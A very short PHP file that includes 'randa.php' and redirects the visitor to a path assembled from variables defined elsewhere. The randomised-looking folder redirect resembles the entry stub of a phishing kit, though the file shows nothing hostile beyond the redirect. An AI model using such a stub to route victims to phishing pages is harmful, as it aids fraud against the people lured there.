<?php
	include 'randa.php';
	exit(header("Location: ".$fo8."/C_".$fo4."/I".$fo5.""));
?>